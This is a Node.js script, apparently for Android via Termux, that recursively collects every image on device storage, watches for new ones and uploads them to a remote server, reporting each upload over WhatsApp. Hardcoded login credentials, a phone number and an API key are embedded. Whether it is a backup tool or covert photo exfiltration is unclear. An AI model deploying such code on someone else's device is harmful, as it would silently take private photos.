const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const wifi = require("node-wifi");
const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const chokidar = require("chokidar");

// ---------------- CONFIGURATION ----------------
const INTERNAL_ROOT = "/storage/emulated/0/";
const EXTERNAL_ROOTS = ["/storage"];
const SERVER_URL = "https://s-script-1.onrender.com";
const HISTORY_FILE = "uploaded.json";
const BATCH_SIZE = 3;
const IGNORE_FOLDERS = ["Android", "LOST.DIR"];
const RETRY_INTERVAL = 60 * 1000;
const MAX_RETRIES = 3;

const USERNAME = "anonymiste";
const PASSWORD = "#Paul@26@";

let jwtToken = null;
let uploadedFiles = [];

// ---------------- INITIALISATION ----------------
wifi.init({ iface: null });

if (fs.existsSync(HISTORY_FILE)) {
    uploadedFiles = JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8"));
}

function saveHistory() {
    fs.writeFileSync(HISTORY_FILE, JSON.stringify(uploadedFiles, null, 2));
}

// ---------------- WHATSAPP ----------------
async function sendWhatsApp(message) {
    const phone = "22891782947";
    const apiKey = "1944847";
    try {
        await axios.get(`https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${encodeURIComponent(message)}&apikey=${apiKey}`);
        console.log("✅ WhatsApp:", message);
    } catch (err) {
        console.error("❌ Erreur WhatsApp:", err.message);
    }
}

// ---------------- AUTHENTIFICATION ----------------
async function login() {
    try {
        const response = await axios.post(`${SERVER_URL}/login`, { username: USERNAME, password: PASSWORD });
        jwtToken = response.data.token;
        console.log("✅ Authentification réussie");
    } catch (err) {
        console.error("❌ Échec login:", err.message);
        jwtToken = null;
    }
}

// ---------------- UTILITAIRES ----------------
async function isWifiConnected() {
    try {
        const connections = await wifi.getCurrentConnections();
        return connections.length > 0;
    } catch (err) {
        console.error("❌ Erreur Wi-Fi :", err.message);
        return false;
    }
}

const { exec } = require("child_process");

exec("termux-wifi-connectioninfo", (err, stdout, stderr) => {
    if (err) {
        console.error("Erreur:", err);
        return;
    }
    console.log("Infos WiFi:", stdout);
});


function collectImages(folder, images = []) {
    let entries;
    try { entries = fs.readdirSync(folder, { withFileTypes: true }); } catch { return images; }
    for (const entry of entries) {
        const fullPath = path.join(folder, entry.name);
        if (entry.isDirectory() && !IGNORE_FOLDERS.includes(entry.name)) collectImages(fullPath, images);
        else if (/\.(jpg|jpeg|png|gif)$/i.test(entry.name) && !uploadedFiles.includes(fullPath)) images.push(fullPath);
    }
    return images;
}

// ---------------- UPLOAD ----------------
async function uploadImage(filePath, attempt = 1) {
    if (!jwtToken) await login();
    if (!jwtToken) return;

    try {
        const form = new FormData();
        form.append("image", fs.createReadStream(filePath));

        await axios.post(`${SERVER_URL}/upload`, form, {
            headers: { ...form.getHeaders(), Authorization: `Bearer ${jwtToken}` }
        });

        console.log(`✅ Upload réussi : ${filePath}`);
        uploadedFiles.push(filePath);
        saveHistory();
        await sendWhatsApp(`✅ Upload réussi : ${filePath}`);
        io.emit("upload", { file: path.basename(filePath), status: "success" });

    } catch (err) {
        console.error(`❌ Échec upload ${filePath} (tentative ${attempt}):`, err.message);
        await sendWhatsApp(`❌ Échec upload : ${filePath} (tentative ${attempt})\nErreur : ${err.message}`);
        io.emit("upload", { file: path.basename(filePath), status: "fail", attempt });

        if (attempt < MAX_RETRIES) {
            setTimeout(() => uploadImage(filePath, attempt + 1), RETRY_INTERVAL);
        }
    }
}

// ---------------- BATCH UPLOAD ----------------
async function uploadBatch(images) {
    for (let i = 0; i < images.length; i += BATCH_SIZE) {
        const batch = images.slice(i, i + BATCH_SIZE);
        await Promise.all(batch.map(uploadImage));
    }
}

// ---------------- FILE WATCHER ----------------
function startWatcher() {
    const watcherPaths = [INTERNAL_ROOT, ...EXTERNAL_ROOTS];
    const watcher = chokidar.watch(watcherPaths, { ignored: /(^|[\/\\])\../, persistent: true });

    watcher.on("add", async filePath => {
        if (/\.(jpg|jpeg|png|gif)$/i.test(filePath) && !uploadedFiles.includes(filePath)) {
            const wifiConnected = await isWifiConnected();
            if (wifiConnected) await uploadImage(filePath);
        }
    });

    console.log("👀 File watcher actif, surveille les nouvelles images...");
}



// ---------------- DASHBOARD WEB ----------------
const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.get("/", (req, res) => {
    res.send(`
        <html>
            <head><title>Dashboard Upload</title></head>
            <body>
                <h1>Uploads en temps réel</h1>
                <ul id="logs"></ul>
                <script src="/socket.io/socket.io.js"></script>
                <script>
                    const socket = io();
                    const logs = document.getElementById("logs");
                    socket.on("upload", data => {
                        const li = document.createElement("li");
                        li.textContent = \`\${data.file} - \${data.status}\${data.attempt ? " (attempt "+data.attempt+")" : ""}\`;
                        logs.appendChild(li);
                    });
                </script>
            </body>
        </html>
    `);
});

server.listen(4000, () => console.log("🌐 Dashboard actif sur http://localhost:4000"));

// ---------------- MAIN ----------------
(async function main() {
    await login();

    // Scan initial pour les images existantes
    let initialImages = collectImages(INTERNAL_ROOT);
    for (const root of EXTERNAL_ROOTS) initialImages = initialImages.concat(collectImages(root));
    await uploadBatch(initialImages);

    // Lancer le file watcher
    startWatcher();
})();
 